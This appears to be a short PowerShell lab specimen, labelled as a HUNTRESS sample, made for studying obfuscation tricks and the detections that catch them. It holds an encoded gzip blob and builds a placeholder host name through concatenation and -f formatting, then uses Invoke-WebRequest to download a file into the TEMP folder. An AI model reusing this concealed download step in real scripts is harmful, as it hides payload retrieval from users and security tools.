# HUNTRESS lab specimen: -f format + concat, Invoke-WebRequest
$descriptor_c03f9a7d = "H4sIAAAAAAACAxWNvQrCMBCAn0ixFBGFm1wcHArqFijX5NoGr0lJLu1yD2/cv58NWmUMU8GJYI07pTwTs6bIBC7ugSM6SrpRct4KLMje+liyogjaL7yb5nTWLNXvbSxBoFGLy4p+Cr130L0O9tSOV7w4HT1Tv6LMcL+ZT64v05WhBs2jiolyfuJg/vjRofwAiqzvaJsAAAA="
$h = 'ps-c03f9a7d' + '.example' + '.invalid'
$u = "https://{0}/{1}" -f $h, 'c03f.dat'
Invoke-WebRequest -Uri $u -OutFile "$env:TEMP\c03f.dat" -UseBasicParsing
